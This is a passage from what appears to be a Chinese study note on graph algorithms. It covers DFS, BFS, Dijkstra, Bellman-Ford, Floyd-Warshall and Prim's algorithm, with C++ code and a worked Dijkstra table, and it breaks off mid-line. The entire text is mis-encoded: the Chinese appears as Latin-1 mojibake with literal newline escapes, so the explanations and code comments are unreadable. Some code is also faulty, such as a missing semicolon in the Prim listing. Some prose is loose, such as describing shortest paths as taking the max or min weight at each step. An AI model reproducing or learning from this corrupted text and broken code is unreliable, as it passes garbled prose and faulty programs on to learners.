\nä½†è¿™è¡Œä»£ç èƒŒåçš„æ„ä¹‰æ˜¯ï¼š\n\n> æŠŠæ–°çš„è¾¹æ’åœ¨åŸé“¾è¡¨çš„æœ€å‰é¢ï¼ŒåŸæ¥çš„è¾¹é€šè¿‡ `newNode->next` ç»§ç»­æŒ‚åœ¨åé¢ã€‚\n\nå»ºç«‹æ–°èŠ‚ç‚¹çš„æ—¶å€™ `new node{to,head[from]}` æŠŠæ—§çš„é“¾è¡¨æ¥åœ¨æ–°è¾¹åé¢ï¼Œ**å®ç°äº†â€œå¤´æ’æ³•â€è¿½åŠ â€**ã€‚\n\n---\n## éå†\néå†å›¾å’Œéå†äºŒå‰æ ‘ä¸å¤ªä¸€æ ·ï¼Œå›¾çš„æ¯ä¸ªé¡¶ç‚¹åœ°ä½ç›¸åŒï¼Œæˆ‘ä»¬è¦åˆ¤æ–­â€œä¸€ä¸ªç‚¹æ˜¯å¦è¢«è®¿é—®è¿‡â€ï¼Œé¿å…é—æ¼ã€‚\n\n### DFS\n*å…¶å®æ„Ÿè§‰æœ‰ç‚¹åƒå¼€ bool æ•°ç»„å‘¢...*\næ·±åº¦ä¼˜å…ˆéå†ã€‚\n![](/images/æ•°æ®ç»“æ„-å›¾/20250401110553640.png)\n**è®¿é—®æ–¹å¼**ï¼š\n- ä»é€‰ä¸­çš„æŸä¸€ä¸ªæœªè®¿é—®è¿‡çš„é¡¶ç‚¹å‡ºå‘ï¼Œè®¿é—®å¹¶å¯¹è¯¥é¡¶ç‚¹åŠ å·²è®¿é—®æ ‡å¿—ã€‚\n- ä¾æ¬¡ä»è¯¥é¡¶ç‚¹çš„æœªè¢«è®¿é—®è¿‡çš„ç¬¬1ä¸ªã€ç¬¬2ä¸ªã€ç¬¬3ä¸ªâ€¦â€¦ é‚»æ¥é¡¶ç‚¹å‡ºå‘ï¼Œä¾æ¬¡è¿›è¡Œ**æ·±åº¦ä¼˜å…ˆéå†**ï¼Œå³è½¬å‘1ã€‚\n- å¦‚æœè¿˜æœ‰é¡¶ç‚¹æœªè¢«è®¿é—®è¿‡ï¼Œé€‰ä¸­å…¶ä¸­ä¸€ä¸ªé¡¶ç‚¹ä½œä¸ºèµ·å§‹é¡¶ç‚¹ï¼Œå†æ¬¡è½¬å‘1ã€‚å¦‚æœ æ‰€æœ‰çš„é¡¶ç‚¹éƒ½è¢«è®¿é—®åˆ°ï¼Œéå†ç»“æŸã€‚\nç®€å•ç‚¹å°±æ˜¯ï¼Œä¸€æ¡è·¯ä¸€ç›´èµ°ï¼Œèµ°åˆ°å¤´ï¼Œæ ˆå¼å›é€€ï¼Œä¸€å±‚å±‚å¸è½½ã€‚\n**æ³¨æ„ï¼š** \n- æ·±åº¦ä¼˜å…ˆéå†ç»“æœä¸å”¯ä¸€ã€‚\n- DFS æ˜¯ä¸€ä¸ªå…¸å‹çš„**é€’å½’è¿‡ç¨‹**ï¼Œç”¨å¯¹è§„æ¨¡å°çš„å›¾çš„éå†é—®é¢˜è§£å†³å¤§å›¾éå†é—®é¢˜ã€‚\n**å®ç°**ï¼š\næ·±åº¦ä¼˜å…ˆï¼Œå°±æ˜¯å¼€boolæ•°ç»„å§...é€’å½’åªè¦åšåˆ°â€æ¥è¿‡â€œå°±å¯ä»¥äº†ã€‚\n\nä»æŒ‡å®šç‚¹å¼€å§‹æ·±åº¦ä¼˜å…ˆéå†ï¼Œæˆ‘ä»¬å…ˆæŠŠä¸€ä¸ªç‚¹å˜æˆ true ï¼Œä»å®ƒå¼€å§‹...\n```cpp\nvoid DFS(Graph G, int v, bool visited[]) {\n    visited[v] = true;         // æ ‡è®°å½“å‰ç‚¹å·²è®¿é—®\n    for (æ¯ä¸€ä¸ªä¸ v ç›¸é‚»çš„é¡¶ç‚¹ u) {\n        if (!visited[u]) {\n            DFS(G, u, visited);  // é€’å½’è®¿é—®æœªè®¿é—®çš„é‚»å±…\n        }\n    }\n}\n\n```\n\n### BFS\nå¹¿åº¦ä¼˜å…ˆéå†ã€‚\n![](/images/æ•°æ®ç»“æ„-å›¾/20250401110701225.png)\n**è®¿é—®æ–¹å¼**ï¼š\n- ä»é€‰ä¸­çš„æŸä¸€ä¸ªæœªè®¿é—®è¿‡çš„é¡¶ç‚¹å‡ºå‘ï¼Œè®¿é—®å¹¶å¯¹è¯¥é¡¶ç‚¹åŠ å·²è®¿é—®æ ‡å¿—ã€‚\n- ä¾æ¬¡å¯¹è¯¥é¡¶ç‚¹çš„æœªè¢«è®¿é—®è¿‡çš„ç¬¬1ä¸ªã€ç¬¬2ä¸ªã€ç¬¬3ä¸ªâ€¦â€¦ç¬¬ k ä¸ªé‚»æ¥ç‚¹ v1ã€v2 ã€v3â€¦â€¦ vkè¿›è¡Œè®¿é—®ä¸”åŠ å·²è®¿é—®æ ‡å¿—ã€‚\n- ä¾æ¬¡å¯¹é¡¶ç‚¹ v1 ã€v2ã€v3â€¦â€¦ vkè½¬å‘æ“ä½œ2ã€‚\n- å¦‚æœè¿˜æœ‰é¡¶ç‚¹æœªè¢«è®¿é—®è¿‡ï¼Œé€‰ä¸­å…¶ä¸­ä¸€ä¸ªé¡¶ç‚¹ä½œä¸ºèµ·å§‹é¡¶ç‚¹ï¼Œå†æ¬¡è½¬å‘1ã€‚å¦‚æœ æ‰€æœ‰çš„é¡¶ç‚¹éƒ½è¢«è®¿é—®åˆ°ï¼Œéå†ç»“æŸã€‚\n\n> ä¸æ·±åº¦ä¼˜å…ˆä¸å¤ªä¸€æ ·çš„æ˜¯ï¼Œå¹¿åº¦ä¼˜å…ˆåƒæ˜¯ â€œè®¿é—®é‚»å±…â€œï¼Œç¡®ä¿ä»ä¸€ä¸ªç‚¹å‡ºå‘ï¼Œæ‰€æœ‰ä¸è¯¥ç‚¹è¿æ¥çš„ç‚¹éƒ½éå†åˆ°ï¼Œç„¶åå†è·³è½¬ä¸‹ä¸€ç‚¹ã€‚\n\n**æ³¨æ„**ï¼š\n- å¹¿åº¦ä¼˜å…ˆéå†ç»“æœä¸å”¯ä¸€ã€‚\n- **å¹¿åº¦ä¼˜å…ˆéå†ä¸æ˜¯é€’å½’è¿‡ç¨‹**ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªå¯¹ç‚¹çš„é€ä¸ªè®¿é—®ã€‚\n**å®ç°**ï¼š\n```cpp\nvoid BFS(Graph G, int start, bool visited[]) {\n    queue<int> q;\n    visited[start] = true;\n    q.push(start);  // èµ·ç‚¹å…¥é˜Ÿ\n\n    while (!q.empty()) {\n        int v = q.front(); q.pop();   // å–å‡ºå½“å‰ç‚¹\n        for (æ¯ä¸€ä¸ªä¸ v ç›¸é‚»çš„é¡¶ç‚¹ u) {\n            if (!visited[u]) {\n                visited[u] = true;    // æ ‡è®°ä¸ºå·²è®¿é—®\n                q.push(u);            // é‚»å±…å…¥é˜Ÿ\n            }\n        }\n    }\n}\n\n```\n\n## åº”ç”¨\n### æœ€çŸ­è·¯å¾„é—®é¢˜ï¼ˆDijkstraï¼ŒBellman-Fordï¼ŒFloyd-Warshallï¼‰\n**å®šä¹‰**ï¼šåœ¨æœ€çŸ­è·¯å¾„é—®é¢˜ä¸­ï¼Œç»™å®šä¸€ä¸ªå¸¦æœ‰æƒå€¼çš„æœ‰å‘å›¾ G=(V,E)ï¼Œä»¤w(u,v)è¡¨ç¤ºè¾¹(u,v)çš„æƒå€¼ã€‚å›¾ä¸­ä¸€æ¡è·¯å¾„p=<v_0,v_1,...,v_k>çš„æƒå€¼w(p)æ˜¯æ„æˆè¯¥è·¯å¾„çš„æ‰€æœ‰è¾¹çš„æƒå€¼ä¹‹å’Œï¼Œåœ¨æ‰€æœ‰çš„ä»é¡¶ç‚¹uåˆ°é¡¶ç‚¹vçš„è·¯å¾„å½“ä¸­ï¼Œæƒå€¼æœ€å°çš„é‚£æ¡è·¯å¾„ç§°ä¹‹ä¸ºä»uåˆ°vçš„æœ€çŸ­è·¯å¾„ã€‚\n*è¯´ç™½äº†å°±æ˜¯æ¯æ¬¡éƒ½èµ°æƒå€¼æœ€å¤§oræœ€å°çš„è·¯å¾„ã€‚æœ€åæ•´æ¡è·¯å¾„æ˜¯æƒå€¼æœ€å¤§oræœ€å°çš„ã€‚*\n\n**é‡è¦æ€§è´¨**ï¼šç»™å®šä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„ä¸€æ¡æœ€çŸ­è·¯å¾„ï¼Œåˆ™åœ¨è¯¥è·¯å¾„ä¸Šä»»æ„ä¸¤ä¸ªç‚¹çš„è·¯å¾„éƒ½æ˜¯æœ€çŸ­çš„ï¼Œè¿™ç§æœ€çŸ­å­è·¯å¾„ç§°ä¸ºæœ€ä¼˜å­ç»“æ„ã€‚\n*ä¸€æ¡å¤§è·¯æ˜¯æœ€ä¼˜è§£ï¼Œé‚£ä¹ˆæ¯æ¡å°è·¯éƒ½æ˜¯æœ€ä¼˜è§£ã€‚*\n\næˆ‘ä»¬ç”¨åŠ¨æ€è§„åˆ’ï¼ŒDijkstraç®—æ³•çš„åŸºç¡€ï¼Œå°±æ˜¯åŸºäºè¿™ä¸ªâ€œæ¯æ¡å°è·¯æœ€ä¼˜è§£â€ã€‚\n#### é—®é¢˜ï¼š ä¸€æ¡æœ€çŸ­è·¯å¾„èƒ½åŒ…å«ç¯è·¯å—ï¼Ÿ\nç­”ï¼š**ä¸èƒ½ã€‚ç»ä¸è¡Œã€‚ä¸ç®¡ç¯çš„æƒå€¼æ˜¯è´Ÿçš„ã€æ­£çš„ï¼Œè¿˜æ˜¯é›¶ï¼Œå…¨éƒ½ä¸è¡Œã€‚**\n##### å¦‚æœç¯çš„æƒå€¼æ˜¯è´Ÿæ•° (è¿™ç©æ„æœ€å±é™©ï¼‰\nå‡è®¾ä½ ä» A å‡ºå‘ï¼Œèµ°åˆ°æŸä¸ªåœ°æ–¹é‡åˆ°äº†ä¸€ä¸ªè´Ÿæƒç¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªç¯è¶Šç»•è¶Šâ€œçœé’±â€ã€‚\né‚£å¹²å˜›ä¸åœ¨è¿™ä¸ªç¯é‡Œç»•ä¸€ç™¾ä¸‡åœˆï¼Œæä¸ªè´Ÿæ— ç©·å¤§ï¼Ÿä½ è¿™ä»€ä¹ˆæœ€çŸ­è·¯å¾„ï¼Œæ˜æ˜è¿˜å¯ä»¥æ›´çŸ­ï¼\nåªè¦**å›¾é‡Œèƒ½ä»èµ·ç‚¹èµ°åˆ°ä¸€ä¸ªè´Ÿæƒç¯ï¼Œé‚£ä½ æ°¸è¿œä¹Ÿæ‰¾ä¸åˆ°çœŸæ­£çš„æœ€çŸ­è·¯å¾„**ï¼Œ\nç»“è®ºï¼šè´Ÿæƒç¯ = æœ€çŸ­è·¯å¾„æ°¸è¿œæ²¡å®Œæ²¡äº†ã€‚\n\n##### å¦‚æœç¯çš„æƒå€¼æ˜¯æ­£æ•°ï¼ˆè¿™ç©æ„æ²¡å•¥ç”¨ï¼‰\nä½ èµ°äº†ä¸€æ¡è·¯ï¼Œä¸­é—´ç»•äº†ä¸ªå°è´µç¯å›æ¥ï¼Œç„¶åå†ç»§ç»­èµ°ã€‚  \né‚£ä½ ä¸ºå•¥è¦èµ°é‚£ä¸ªè´µç¯ï¼Ÿä½ åˆ æ‰å®ƒä¸æ˜¯çœæ›´å¤šï¼Ÿ\n**åªè¦è·¯å¾„é‡Œæœ‰æ­£æƒç¯ï¼Œä½ éƒ½å¯ä»¥åˆ æ‰å®ƒï¼Œå‰©ä¸‹çš„è·¯æ›´çŸ­ã€‚**\nç»“è®ºï¼šæ­£æƒç¯ = æ‹–åè…¿ï¼Œæ²¡å¿…è¦ã€‚\n\n##### å¦‚æœç¯çš„æƒå€¼æ˜¯ 0ï¼ˆ è¿™ç©æ„æœ€å®¹æ˜“éª—ä½ ï¼‰\nä½ ä»¥ä¸ºèµ°è¿™ä¸ª 0 ç¯â€œä¹Ÿæ²¡å¤šä»˜é’±å•Šâ€ï¼Œé‚£å¯å¤ªå¤©çœŸäº†ã€‚  \nè™½ç„¶å®ƒä¸ä¼šè®©è·¯å¾„æ›´å·®ï¼Œä½†å®ƒä¹Ÿä¸ä¼šè®©è·¯å¾„æ›´å¥½ï¼Œ  \n**è€Œä¸”å®ƒè®©ä½ èµ°äº†ä¸€åœˆçº¯å±æµªè´¹æ„Ÿæƒ…ã€‚**\nç»“è®ºï¼š0 æƒç¯ = æ²¡æŸå¤±ä½†ä¹Ÿæ²¡ä»·å€¼ï¼Œæ˜¯åºŸç¯ï¼Œåˆ äº†ä¹Ÿä¸å½±å“æœ€çŸ­è·¯å¾„ã€‚\n\n#### Dijkstraç®—æ³•\næ‰‹å†™ä½œä¸šå†™æœ€çŸ­è·¯å¾„çš„æ—¶å€™ï¼ŒæŒ‰æ•™æé‚£ä¸ªè¡¨è¾¾æ¥ã€‚\néå†+è´ªå¿ƒã€‚\næµç¨‹ï¼š\n- Dijkstra æ¯ä¸€è½®éƒ½æ›´æ–°ã€Œä»æºç‚¹åˆ°æŸèŠ‚ç‚¹çš„æ‰€æœ‰å¯èƒ½è·¯å¾„ã€ï¼Œ**åªå–å½“å‰æœ€çŸ­é‚£ä¸€æ¡**ï¼Œ**å¹¶ä¸æ˜¯**ä¾èµ–äºä¸Šä¸€æ¡é€‰å¥½çš„çº¿è·¯è€Œè´ªå¿ƒå¢åŠ ã€‚ï¼ˆæ¯”å¦‚é€‰å¥½äº†<4,2,3>æ˜¯4åˆ°3æœ€çŸ­ï¼Œå†çœ‹4åˆ°6çš„æ—¶å€™ï¼Œé™¤äº†è¦çœ‹<4,2,3,6>,å¯èƒ½è¿˜è¦çœ‹<4,6>,<4,2,6>ç­‰ç­‰...ï¼‰\n\nå®ä¾‹ï¼š\n\t![é¢˜ç›®](https://img.moyuin.top/i/2025/04/21/6806420d215bc.png)\n*é¡ºä¾¿ç»™ä¸€ä¸‹æ•™æå†™æ³•ï¼Œè€ƒè¯•æ ¼å¼...*\n![image.png](https://img.moyuin.top/i/2025/04/21/680644fd78993.png)\n\n\n- æ ‡è®°ï¼ˆèˆï¼‰æ˜¯å› ä¸ºæ¯”å·²çŸ¥å­˜åœ¨è·¯å¾„è¦æƒé‡å¤§ï¼Œå› æ­¤ä¸ä½œä¸ºä¸‹ä¸ªæœªæ ‡è®°ç‚¹çš„è·¯å¾„ã€‚\n\n|       ç»ˆç‚¹        | i=1       | i=2        | i=3            | i=4         | i=5           |\n| :-------------: | :-------- | :--------- | :------------- | :---------- | :------------ |\n|        1        | âŸ¨4,1âŸ©20   | âŸ¨4,2,1âŸ©15  |                | â¬› âŸ¨4,6,1âŸ©12 |               |\n|        2        | â¬› âŸ¨4,2âŸ©5  |            |                |             |               |\n|        3        |           | â¬› âŸ¨4,2,3âŸ©8 |                |             |               |\n|        5        | â¬› âŸ¨4,5âŸ©11 |            | âŸ¨4,2,3,5âŸ©23(èˆ) | âŸ¨4,6,5âŸ©13   |               |\n|        6        | â¬› âŸ¨4,6âŸ©10 |            |                |             |               |\n|  u(é€‰å¥½çš„æœ€çŸ­è·¯å¾„èŠ‚ç‚¹)   | 2         | 3          | 6              | 5           | 1             |\n| s(å·²ç¡®å®šæœ€çŸ­è·¯å¾„çš„èŠ‚ç‚¹é›†åˆ) | {4,2}     | {4,2,3}    | {4,2,3,6}      | {4,2,3,6,5} | {4,2,3,6,5,1} |\n æœ€ç»ˆç»“æœï¼ˆæœ€çŸ­è·¯å¾„ï¼‰ï¼š\n- v1ï¼šâŸ¨4,6,1âŸ©ï¼Œdist=12\n- v2ï¼šâŸ¨4,2âŸ©ï¼Œdist=5\n- v3ï¼šâŸ¨4,2,3âŸ©ï¼Œdist=8\n- v5ï¼šâŸ¨4,5âŸ©ï¼Œdist=11\n- v6ï¼šâŸ¨4,6âŸ©ï¼Œdist=10\n\nä»£ç å®ç°ï¼ˆè¿™é‡Œæ˜¯æŠŠæ‰€æœ‰ç‚¹åˆ°ç‚¹çš„è·ç¦»å…¨éƒ¨è®¡å…¥äº†ï¼‰ï¼š\n```cpp\nvoid dijkstra(int n, int start, vector<vector<int>>& graph) {\n    vector<int> dist(n, INF);     // å­˜å‚¨èµ·ç‚¹åˆ°å„ç‚¹çš„æœ€çŸ­è·ç¦»\n    vector<bool> visited(n, false); // æ ‡è®°å“ªäº›ç‚¹å·²ç»ç¡®å®šæœ€çŸ­è·¯å¾„\n\n    dist[start] = 0; // èµ·ç‚¹åˆ°è‡ªå·±çš„è·ç¦»æ˜¯0\n\n    for (int i = 0; i < n; i++) {\n        int u = -1;\n        int minDist = INF;\n\n        // æ‰¾å½“å‰æœªè®¿é—®çš„ç‚¹ä¸­ï¼Œè·ç¦»èµ·ç‚¹æœ€è¿‘çš„é‚£ä¸ª\n        for (int j = 0; j < n; j++) {\n            if (!visited[j] && dist[j] < minDist) {\n                u = j;\n                minDist = dist[j];\n            }\n        }\n\n        if (u == -1) break; // å¦‚æœæ²¡æ‰¾åˆ°è¯´æ˜å‰©ä¸‹çš„éƒ½ä¸å¯è¾¾ï¼Œç»“æŸ\n\n        visited[u] = true; // æ ‡è®°è¿™ä¸ªç‚¹å·²ç»ç¡®å®šæœ€çŸ­è·¯å¾„\n\n        // æ›´æ–°ä¸uç›¸é‚»çš„ç‚¹çš„è·ç¦»\n        for (int v = 0; v < n; v++) {\n            if (!visited[v] && graph[u][v] != INF) {\n                if (dist[u] + graph[u][v] < dist[v]) {\n                    dist[v] = dist[u] + graph[u][v];\n                }\n            }\n        }\n    }\n\n    // è¾“å‡ºç»“æœ\n    for (int i = 0; i < n; i++) {\n        if (dist[i] == INF)\n            cout << \"ä»\" << start << \"åˆ°\" << i << \"ï¼šä¸å¯è¾¾\" << endl;\n        else\n            cout << \"ä»\" << start << \"åˆ°\" << i << \"ï¼šæœ€çŸ­è·ç¦» = \" << dist[i] << endl;\n    }\n}\n\n```\n\n---\n#### Bellman-Fordç®—æ³•\n**æ ¸å¿ƒæ€æƒ³**ï¼šBellman-Fordç®—æ³•é€šè¿‡å¯¹è¾¹è¿›è¡Œ**æ¾å¼›çš„æ–¹å¼**æ¸è¿‘åœ°æ±‚å‡º**æºé¡¶ç‚¹såˆ°å…¶ä½™é¡¶ç‚¹v**çš„æœ€çŸ­è·¯å¾„è·ç¦»ã€‚\n- **Dijkstra ä¸æ”¯æŒè´Ÿæƒè¾¹**ï¼ˆå°±æ˜¯è¾¹çš„æƒå€¼å¯ä»¥æ˜¯è´Ÿæ•°ï¼‰\n- **Bellman-Ford å¯ä»¥ï¼**\n>Bellman-Ford çš„æ ¸å¿ƒæœºåˆ¶å°±æ˜¯ï¼š\n> **â€œä½ åˆ«æ€¥ï¼Œæˆ‘å¸®ä½ æŠŠè·¯å¾„æ¾å¼› V-1 æ¬¡ã€‚â€**\n>å•¥å«â€œæ¾å¼›â€ï¼Ÿä¸æ˜¯æ‹‰ç­‹ï¼Œæ˜¯æ›´æ–°è·¯å¾„ï¼š\n\næ¯æ¬¡æ¾å¼›ï¼Œå°±æ˜¯å°è¯•ï¼š\n\n> â€œå¦‚æœä» A åˆ° B è¿™æ¡è¾¹èƒ½è®© B çš„æœ€çŸ­è·ç¦»æ›´å°ï¼Œæˆ‘å°±æ›´æ–°ä¸€ä¸‹åˆ°è¾¾ B çš„æœ€çŸ­è·ç¦»ã€‚â€\n\nä½ æŠŠå›¾é‡Œæ‰€æœ‰è¾¹ä¸€éä¸€éæ‰«ï¼Œ  \næ¯å‘ç°èƒ½æ›´æ–°çš„è·¯å¾„ï¼Œå°±æ›´æ–°ã€‚  \né‡å¤è¿™ä¸ªè¿‡ç¨‹ **V-1 æ¬¡**ï¼ˆV = ç‚¹çš„æ•°é‡ï¼‰ã€‚\n\nå› ä¸ºæœ€çŸ­è·¯å¾„æœ€å¤šç»è¿‡ V-1 æ¡è¾¹ï¼Œ  \nå†å¤šå°±æ˜¯ç¯äº†ï¼Œä½ å°±ç»•åœˆåœˆäº†ã€‚\n> â€œå¦‚æœæˆ‘æ¾å¼›äº† V-1 æ¬¡è¿˜æ²¡å®Œï¼Œ  \n> ç¬¬ V æ¬¡è¿˜èƒ½ç»§ç»­æ›´æ–°ï¼Œé‚£è¯´æ˜ä½ æœ‰ **è´Ÿæƒç¯**ï¼Œæ— é™çœé’±å¤§éª—å±€ï¼Œæ•´ä¸ªå›¾ç‚¸äº†ã€‚â€\n\nä»£ç å®ç°ï¼š\n```cpp\nbool bellmanFord(int n, int start, vector<Edge>& edges, vector<int>& dist) {\n    dist.assign(n, INF);\n    dist[start] = 0;\n\n    // è¿›è¡Œ n-1 æ¬¡æ¾å¼›æ“ä½œ\n    for (int i = 0; i < n - 1; i++) {\n        for (auto edge : edges) {\n            if (dist[edge.u] != INF && dist[edge.u] + edge.w < dist[edge.v]) {\n                dist[edge.v] = dist[edge.u] + edge.w;\n            }\n        }\n    }\n\n    // ç¬¬næ¬¡æ¾å¼›ï¼Œæ£€æµ‹æ˜¯å¦è¿˜æœ‰å¯ä»¥æ›´æ–°çš„â€”â€”æœ‰å°±ä»£è¡¨å­˜åœ¨è´Ÿæƒå›è·¯\n    for (auto edge : edges) {\n        if (dist[edge.u] != INF && dist[edge.u] + edge.w < dist[edge.v]) {\n            return false; // æœ‰è´Ÿæƒç¯\n        }\n    }\n\n    return true; // æˆåŠŸï¼Œæ²¡æœ‰è´Ÿæƒç¯\n}\n```\næœ‰è´Ÿæƒç¯æ²¡ç­”æ¡ˆã€‚ç­”æ¡ˆå­˜åœ¨ dist æ•°ç»„é‡Œã€‚\n\n---\n#### Floyd-Warshallç®—æ³•\n**ç®—æ³•ä»‹ç»**ï¼šFloyd-Warshallç®—æ³•æ˜¯ä¸€ç§åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Œèƒ½è§£å†³**æ‰€æœ‰é¡¶ç‚¹å¯¹æœ€çŸ­è·¯å¾„**é—®é¢˜ï¼Œè¿è¡Œæ—¶é—´ä¸ºO(|V|^3)ï¼Œèƒ½å¤Ÿå¤„ç†æƒå€¼ä¸ºè´Ÿçš„è¾¹ã€‚\n**ä»£ç æ›´çŸ­ã€‚**\n\n**æ ¸å¿ƒæ€æƒ³**ï¼šå¦‚æœä½ æƒ³è®© i åˆ° j æ›´çŸ­ï¼Œé‚£è¯•è¯•çœ‹ä» i åˆ° k å†åˆ° j ä¼šä¸ä¼šæ›´ä¾¿å®œã€‚\n> ä½ æœ‰ä¸€å¼ å›¾ï¼Œä»»æ„ä¸¤ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ä½ éƒ½æƒ³çŸ¥é“ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å¤ªç´¯ï¼Œé‚£ä½ å¹²è„†ï¼š  \n>**è®©æ¯ä¸ªç‚¹éƒ½è½®æµå½“â€œä¸­è½¬ç«™â€ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯èƒ½è®©ä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»å˜çŸ­ã€‚**\n\n**æœ¬è´¨**ï¼š\nä½ è¦æ›´æ–°çš„è·¯å¾„æ˜¯ `dist[i][j]`ï¼Œ  \næ¯å½“ä½ å‘ç°ï¼š\n`dist[i][j] > dist[i][k] + dist[k][j]`\n\nä½ å°±åšä¸€æ¬¡æ¾å¼›\n`dist[i][j] = dist[i][k] + dist[k][j];`\n\nä»£ç ä¸å¤ªä¼˜é›…ï¼š\n*ä» i åˆ° jï¼Œå¦‚æœæˆ‘ä¸­è½¬ä¸€ä¸‹ kï¼Œæ˜¯ä¸æ˜¯æ›´ä¾¿å®œï¼Ÿ*\n```cpp\nfor (int k = 1; k <= n; ++k)  // ä¸­è½¬ç‚¹\n    for (int i = 1; i <= n; ++i)    // èµ·ç‚¹\n        for (int j = 1; j <= n; ++j)// ç»ˆç‚¹\n            if (dist[i][j] > dist[i][k] + dist[k][j])\n                dist[i][j] = dist[i][k] + dist[k][j];\n\n```\nä¸èƒ½æœ‰è´Ÿç¯ï¼Œå¦åˆ™ç»“æœä¼šå‡ºäº‹ï¼ˆæ— é™å¥—ç°ï¼‰ã€‚\n\n---\n### æœ€å°ç”Ÿæˆæ ‘ï¼ˆæœ€å°æ”¯æ’‘æ ‘ï¼‰é—®é¢˜ï¼ˆç”ŸæˆMSTï¼‰\n**å®šä¹‰**ï¼šç»™å®šä¸€ä¸ªè¿é€šçš„åŠ æƒå›¾G=(V,E)ï¼Œå…¶ä¸­Vä¸ºé¡¶ç‚¹çš„é›†åˆï¼ŒEä¸ºè¾¹çš„é›†åˆï¼Œå…¶ä¸­Eä¸­çš„æ¯æ¡è¾¹éƒ½æœ‰ä¸€ä¸ªéè´Ÿçš„æƒå€¼ã€‚æœ€å°ç”Ÿæˆæ ‘é—®é¢˜æ˜¯åœ¨Gä¸­**æ±‚è§£æƒå€¼æœ€å°çš„ç”Ÿæˆæ ‘**ï¼ˆMSTï¼‰ã€‚\n#### Primç®—æ³•\næ˜¯ä¸€ä¸ªè´ªå¿ƒç®—æ³•ï¼Œæ„é€ æ ‘çš„æ—¶å€™ï¼Œæ¯æ¬¡éƒ½æ˜¯é€‰æ‹©æƒå€¼æœ€å°çš„è·¯å¾„è¿æ¥ç‚¹ä¸ç‚¹ã€‚\nä¸€ä¸ªç‚¹å‡ºå‘ï¼Œæ…¢æ…¢å¾€å¤–è¿è¾¹ï¼Œæ¯æ¬¡éƒ½é€‰ï¼š\n> **â€œä»å·²ç»è¿æ¥å¥½çš„ç‚¹ï¼Œåˆ°å¤–é¢å»çš„è¾¹ä¸­ï¼Œæœ€çŸ­çš„é‚£ä¸€æ¡ã€‚â€**\n\nprimç®—æ³•å’ŒDijkstraç®—æ³•çš„æ€æƒ³å¾ˆåƒå¾ˆåƒï¼Œä¸è¿‡ä¸€ä¸ªæ˜¯å…³æ³¨**å•çº¯ç‚¹åˆ°ç‚¹çš„è·¯å¾„çš„æƒå€¼**ï¼Œä¸€ä¸ªæ˜¯å…³æ³¨**ä»æºç‚¹åˆ°è¯¥ç‚¹çš„è·¯å¾„å’Œ**ã€‚ä¹Ÿè¦æ³¨æ„ä¿ç•™**æœªé€‰å–è·¯å¾„ä¸­æŒ‡å‘æœªé€‰å–ç‚¹çš„**ã€‚\n\n\nç…§æ ·**ä¸èƒ½å»æˆç¯**ï¼Œç†ç”±å’Œæœ€çŸ­è·¯å¾„çš„é‚£ä¸ªä¸€æ ·çš„ã€‚\n##### ä»£ç å®ç°ï¼š\n- ä»£ç æ€»è§ˆï¼š(é‚»æ¥çŸ©é˜µå®ç°)\n```cpp\n#include <iostream>\n#include <vector>\n#include <climits>\n\nusing namespace std;\n\nconst int INF = INT_MAX;\nconst int N = 100; // æœ€å¤§é¡¶ç‚¹æ•°\n\nint graph[N][N]; // é‚»æ¥çŸ©é˜µ\nvector<bool>visited(N,false); // æ ‡è®°æ˜¯å¦åŠ å…¥MSTï¼Œå“ªäº›ç‚¹å·²ç»è¢«æˆ‘ä»¬é€‰äº†\nvector<int>dist(N,INF)     // åˆ°MSTçš„æœ€å°è¾¹æƒå€¼ï¼Œåˆå§‹æ¯ä¸ªç‚¹éƒ½è´µå¾—ç¦»è°±\nint n;           // é¡¶ç‚¹æ•°é‡\n\nint prim(int start) {\n\n    dist[start] = 0;\n    int totalWeight = 0;\n\n    for (int i = 0; i < n; i++) { \n    //ç»™æ¯ä¸€ä¸ªç‚¹æ‰¾æœ€ä¾¿å®œçš„æƒå€¼,å¤„ç†ååŠ ä¸Šå»\n        int u = -1, minDist = INF;\n        //ä»è¿˜æ²¡é€‰çš„ç‚¹ä¸­é€‰ä¸€ä¸ªæœ€ä¾¿å®œçš„\n        for (int j = 0; j < n; j++) {\n            if (!visited[j] && dist[j] < minDist) {\n                minDist = dist[j];\n                u = j;\n            }\n        }\n\n        if (u == -1) break; // æ‰¾ä¸åˆ°äº†ï¼Œè¯´æ˜ä¸è¿é€š\n\n        visited[u] = true; // æ‰¾åˆ°äº†ï¼Œæ ‡è®°ä¸€ä¸‹ï¼Œä¸‹æ¬¡ä¸é€‰å®ƒäº†ï¼Œä¸ç„¶æœ‰å¯èƒ½å½¢æˆç¯è·¯\n        totalWeight += dist[u]; // åŠ ä¸€ä¸‹æ‰¾åˆ°çš„uç‚¹å‡ºå‘æœ€çŸ­æƒå€¼\n\n        // æ›´æ–°ä»ç‚¹ u å‡ºå‘å¯ä»¥åˆ°è¾¾çš„ï¼Œä½†è¿˜æ²¡å»è¿‡çš„å…¶ä»–ç‚¹çš„ï¼Œæƒå€¼ï¼Œä¾¿äºä¸‹æ¬¡é€‰æ‹©æœ€çŸ­è·¯å¾„\n        for (int v = 0; v < n; v++) {\n            if (!visited[v] && graph[u][v] < dist[v]) { \n\t        //v ç‚¹æˆ‘è¿˜æ²¡å»è¿‡ï¼Œå¹¶ä¸”æˆ‘å‘ç°uåˆ°vç‚¹çš„è·¯å¾„æ¯”æˆ‘ä¸€å¼€å§‹è®¾å®šçš„minDistè¿˜è¦çŸ­ï¼Œé‚£æˆ‘å°±æŠŠå®ƒæ”¹æˆuåˆ°vçš„è¾¹ï¼Œè°ƒæ•´ä¸€ä¸‹\n                dist[v] = graph[u][v];\n            }\n        }\n    }\n\n    return totalWeight; // è¾“å‡ºæœ€çŸ­è·¯å¾„\n}\n\n```\n- è¾“å…¥æ ¼å¼ï¼ˆé‚»æ¥çŸ©é˜µï¼Œé‚»æ¥è¡¨å®ç°å…¶å®è¦éº»çƒ¦ä¸€äº›ï¼Œè¦éå†è¡¨æ‰¾æœ€å€¼ï¼‰\n```cpp\nint n;\ncin >> n;\nvector<vector<int>> graph(n, vector<int>(n));\n\nfor (int i = 0; i < n; i++) {\n    for (int j = 0; j < n; j++) {\n        cin >> 